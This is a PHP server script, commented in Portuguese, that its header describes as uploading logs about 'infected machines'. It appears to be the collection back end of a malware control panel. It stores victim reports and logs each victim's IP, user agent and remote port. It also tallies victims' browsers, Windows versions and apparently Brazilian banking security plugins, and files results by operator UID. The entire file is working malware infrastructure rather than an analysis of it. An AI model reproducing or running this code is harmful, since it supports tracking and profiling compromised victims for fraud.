<?php
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// 
// 034558735432.cpp / Uploader.php ~~
//   Arquivo responsável por fazer upload de arquivo de log com as informações básicas a respeito das máquinas infectadas.
//
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

	error_reporting(0);
	
	if (isset($_FILES['A3948982388842734']['name'])) {
		if ((!empty($_FILES["A3948982388842734"])) && ($_FILES['uploaded_file']['error'] == 0)) {
			
			$filename = basename($_FILES['A3948982388842734']['name']);
			$ext = substr($filename, strrpos($filename, '.') + 1);
			if (($ext == "ini") && ($_FILES["A3948982388842734"]["size"] < 7000)) {
			
				// --- +
				$characters = array( "A","B","C","D","E","F","G","H","J","K","L","M","N","P","Q","R","S","T","U","V","W","X","Y","Z","1","2","3","4","5","6","7","8","9");
				$keys = array();

				while (count($keys) < 7) {
					$x = mt_rand(0, count($characters)-1);
					if (!in_array($x, $keys)) { $keys[] = $x; }
				}
				
				foreach ($keys as $key){ $random_chars .= $characters[$key]; }

				$upDir = getcwd() . "/maquinas/"; $uploadfileXX = $random_chars . rand() . rand(0000,9999) . md5($uploadfile);
				$uploadfile = $upDir . md5($uploadfileXX). ".ini"; 
				move_uploaded_file($_FILES['A3948982388842734']['tmp_name'], $uploadfile); 
				
				function w($a = ''){
					if (empty($a)) return array();
					return explode(' ', $a);
				}

				function _browser ($a_browser = false, $a_version = false, $name = false) {
					$browser_list = 'msie firefox chrome konqueror safari netscape navigator opera mosaic lynx amaya omniweb avant camino flock seamonkey aol mozilla gecko';
					$user_browser = strtolower($_SERVER['HTTP_USER_AGENT']);
					$this_version = $this_browser = '';
					
					$browser_limit = strlen($user_browser);
					foreach (w($browser_list) as $row) {
						$row = ($a_browser !== false) ? $a_browser : $row;
						$n = stristr($user_browser, $row);
						if (!$n || !empty($this_browser)) continue;
						
						$this_browser = $row;
						$j = strpos($user_browser, $row) + strlen($row) + 1;
						for (; $j <= $browser_limit; $j++){
							$s = trim(substr($user_browser, $j, 1));
							$this_version .= $s; if ($s === '') break;
						}
					}
					
					if ($a_browser !== false){
						$ret = false;
						if (strtolower($a_browser) == $this_browser){
							$ret = true;
							if ($a_version !== false && !empty($this_version)){
								$a_sign = explode(' ', $a_version);
								if (version_compare($this_version, $a_sign[1], $a_sign[0]) === false){ $ret = false; }
							}
						}
						return $ret;
					}
					
					$this_platform = '';
					if (strpos($user_browser, 'linux')){ $this_platform = 'linux'; } 
					else if (strpos($user_browser, 'macintosh') || strpos($user_browser, 'mac platform x')){ $this_platform = 'mac'; }
					else if (strpos($user_browser, 'windows') 	|| strpos($user_browser, 'win32')){ $this_platform = 'windows'; }
					
					if ($name !== false){ return $this_browser . ' ' . $this_version; }
					
					return array( "browser"  	=> $this_browser,
								  "version"  	=> $this_version,
								  "platform" 	=> $this_platform,
								  "useragent"	=> $user_browser );
					
					$timestamp  = mktime(date("H")-3, date("i"), date("s"), date("m"), date("d"), date("Y"));
				}
				// --- +
				
				// Adiciona informações...
				$ip = $_SERVER['REMOTE_ADDR']; $vBrowser = _browser();
				
				$info ="\n[Acesso]\nData=".gmdate("d", $timestamp)."/".gmdate("m", $timestamp)."/".gmdate("Y", $timestamp)." - ".gmdate("H", $timestamp).":".gmdate("i", $timestamp).":".gmdate("s", $timestamp).
					   "\nIP=".$ip."\nUserAgent=".$vBrowser['useragent']."\nHostIP=".$_SERVER["HTTP_HOST"]."\nHostName=". $_SERVER["SERVER_NAME"]. 
					   "\nTipoRequest=". $_SERVER["REQUEST_METHOD"]. "\nTempoRequest=". $_SERVER['REQUEST_TIME'] ."\nPortaRemota=". $_SERVER['REMOTE_PORT'] ."\n";

				$abrir_txt = fopen($uploadfile, "a"); fwrite($abrir_txt, $info); fclose($abrir_txt);
				
				// Faz contagem dos navegadores.
				$INIFLX = parse_ini_file($uploadfile, 'NVS');
				
				// Faz contagem do Firefox.
				if ($INIFLX['NVS']['FF'] == 1) {
					$Path = "modules/estatisticas/NVS/FFX.txt"; $Abrir = fopen($Path, "r");
					$Valor = fread($Abrir, filesize($Path)); fclose($Abrir);
					
					$Abrir = fopen($Path, "w"); $ValorX = $Valor + 1;
					$Escreve = fwrite($Abrir, $ValorX); fclose($Abrir);
				}
					
				// Faz contagem do Chrome.
				if ($INIFLX['NVS']['CH'] == 1) {
					$Path = "modules/estatisticas/NVS/CHX.txt"; $Abrir = fopen($Path, "r");
					$Valor = fread($Abrir, filesize($Path)); fclose($Abrir);
					
					$Abrir = fopen($Path, "w"); $ValorX = $Valor + 1;
					$Escreve = fwrite($Abrir, $ValorX); fclose($Abrir);
				}
				
				if ($INIFLX['NVS']['IX'] == 1) {
					// Faz contagem do IE.
					$Path = "modules/estatisticas/NVS/IEX.txt"; $Abrir = fopen($Path, "r");
					$Valor = fread($Abrir, filesize($Path)); fclose($Abrir);
					
					$Abrir = fopen($Path, "w"); $ValorX = $Valor + 1;
					$Escreve = fwrite($Abrir, $ValorX); fclose($Abrir);
				}
				
				if ($INIFLX['NVS']['NS'] == 1) {
					// Faz contagem do Netscape.
					$Path = "modules/estatisticas/NVS/NSX.txt"; $Abrir = fopen($Path, "r");
					$Valor = fread($Abrir, filesize($Path)); fclose($Abrir);
					
					$Abrir = fopen($Path, "w"); $ValorX = $Valor + 1;
					$Escreve = fwrite($Abrir, $ValorX); fclose($Abrir);
				}
				
				if ($INIFLX['NVS']['PR'] == 1) {
					// Faz contagem do Opera.
					$Path = "modules/estatisticas/NVS/OPX.txt"; $Abrir = fopen($Path, "r");
					$Valor = fread($Abrir, filesize($Path)); fclose($Abrir);
					
					$Abrir = fopen($Path, "w"); $ValorX = $Valor + 1;
					$Escreve = fwrite($Abrir, $ValorX); fclose($Abrir);
				}
				
				// Faz contagem dos plugins.
				$INIFLY = parse_ini_file($uploadfile, 'NVS');
				
				// Faz contagem do plugin CEF.
				if ($INIFLY['PLS']['CF'] == 1) {
					$Path = "modules/estatisticas/PLS/CFX.txt"; $Abrir = fopen($Path, "r");
					$Valor = fread($Abrir, filesize($Path)); fclose($Abrir);
					
					$Abrir = fopen($Path, "w"); $ValorX = $Valor + 1;
					$Escreve = fwrite($Abrir, $ValorX); fclose($Abrir);
				}
				
				// Faz contagem do plugin BB.
				if ($INIFLY['PLS']['BX'] == 1) {
					$Path = "modules/estatisticas/PLS/BXB.txt"; $Abrir = fopen($Path, "r");
					$Valor = fread($Abrir, filesize($Path)); fclose($Abrir);
					
					$Abrir = fopen($Path, "w"); $ValorX = $Valor + 1;
					$Escreve = fwrite($Abrir, $ValorX); fclose($Abrir);
				}
				
				// Faz contagem do plugin ABN.
				if ($INIFLY['PLS']['AB'] == 1) {
					$Path = "modules/estatisticas/PLS/ABX.txt"; $Abrir = fopen($Path, "r");
					$Valor = fread($Abrir, filesize($Path)); fclose($Abrir);
					
					$Abrir = fopen($Path, "w"); $ValorX = $Valor + 1;
					$Escreve = fwrite($Abrir, $ValorX); fclose($Abrir);
				}
				
				// Faz contagem do plugin UNI.
				if ($INIFLY['PLS']['UN'] == 1) {
					$Path = "modules/estatisticas/PLS/UNX.txt"; $Abrir = fopen($Path, "r");
					$Valor = fread($Abrir, filesize($Path)); fclose($Abrir);
					
					$Abrir = fopen($Path, "w"); $ValorX = $Valor + 1;
					$Escreve = fwrite($Abrir, $ValorX); fclose($Abrir);
				}
				
				// Faz contagem do plugin Scopus.
				if ($INIFLY['PLS']['SC'] == 1) {
					$Path = "modules/estatisticas/PLS/SCX.txt"; $Abrir = fopen($Path, "r");
					$Valor = fread($Abrir, filesize($Path)); fclose($Abrir);
					
					$Abrir = fopen($Path, "w"); $ValorX = $Valor + 1;
					$Escreve = fwrite($Abrir, $ValorX); fclose($Abrir);
				}
				
				// Faz contagem das Edições do Windows.
				$INIFLZ = parse_ini_file($uploadfile, 'WNI');
				
				// Faz contagem do Windows 8.
				if (strcmp($INIFLY['WNI']['ET'], "WN78") == 0) {
					$Path = "modules/estatisticas/WNS/WN8.txt"; $Abrir = fopen($Path, "r");
					$Valor = fread($Abrir, filesize($Path)); fclose($Abrir);
					
					$Abrir = fopen($Path, "w"); $ValorX = $Valor + 1;
					$Escreve = fwrite($Abrir, $ValorX); fclose($Abrir);
				}
				
				// Faz contagem do Windows 7.
				if (strcmp($INIFLY['WNI']['ET'], "WN7") == 0) {
					$Path = "modules/estatisticas/WNS/WN7.txt"; $Abrir = fopen($Path, "r");
					$Valor = fread($Abrir, filesize($Path)); fclose($Abrir);
					
					$Abrir = fopen($Path, "w"); $ValorX = $Valor + 1;
					$Escreve = fwrite($Abrir, $ValorX); fclose($Abrir);
				}
				
				// Faz contagem do Windows Server 2003.
				if (strcmp($INIFLY['WNI']['ET'], "WNS23") == 0) {
					$Path = "modules/estatisticas/WNS/WNS3.txt"; $Abrir = fopen($Path, "r");
					$Valor = fread($Abrir, filesize($Path)); fclose($Abrir);
					
					$Abrir = fopen($Path, "w"); $ValorX = $Valor + 1;
					$Escreve = fwrite($Abrir, $ValorX); fclose($Abrir);
				}
				
				// Faz contagem do Windows XP.
				if (strcmp($INIFLY['WNI']['ET'], "WNYP") == 0) {
					$Path = "modules/estatisticas/WNS/WNXP.txt"; $Abrir = fopen($Path, "r");
					$Valor = fread($Abrir, filesize($Path)); fclose($Abrir);
					
					$Abrir = fopen($Path, "w"); $ValorX = $Valor + 1;
					$Escreve = fwrite($Abrir, $ValorX); fclose($Abrir);
				}

				// Faz contagem do Windows Vista.
				if (strcmp($INIFLY['WNI']['ET'], "WNV") == 0) {
					$Path = "modules/estatisticas/WNS/WNV.txt"; $Abrir = fopen($Path, "r");
					$Valor = fread($Abrir, filesize($Path)); fclose($Abrir);
					
					$Abrir = fopen($Path, "w"); $ValorX = $Valor + 1;
					$Escreve = fwrite($Abrir, $ValorX); fclose($Abrir);
				}
				
				// Faz contagem do Windows 2000.
				if (strcmp($INIFLY['WNI']['ET'], "WN00") == 0) {
					$Path = "modules/estatisticas/WNS/WN0.txt"; $Abrir = fopen($Path, "r");
					$Valor = fread($Abrir, filesize($Path)); fclose($Abrir);
					
					$Abrir = fopen($Path, "w"); $ValorX = $Valor + 1;
					$Escreve = fwrite($Abrir, $ValorX); fclose($Abrir);
				}
				
				// Faz contagem de outros Windows.
				if (strcmp($INIFLY['WNI']['ET'], "WNUK") == 0) {
					$Path = "modules/estatisticas/WNS/WNEX.txt"; $Abrir = fopen($Path, "r");
					$Valor = fread($Abrir, filesize($Path)); fclose($Abrir);
					
					$Abrir = fopen($Path, "w"); $ValorX = $Valor + 1;
					$Escreve = fwrite($Abrir, $ValorX); fclose($Abrir);
				}
				
				
				// Filtragem por UID...
				$UNIIDX = parse_ini_file($uploadfile, 'UID'); $IDXUID = $UNIIDX['UID']['UID'];
				
				$File = fopen("modules/extras/FUIDX/". $IDXUID . ".txt", "a+");
				if ($File) { 
				$BufX = "[FLXINX]\nFLX=". md5($uploadfileXX) .".ini\n";
				$Grava = fwrite($File, $BufX); fclose($File);
				}
				
			}
		}
	}

// EOF  ~~ 
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
?>
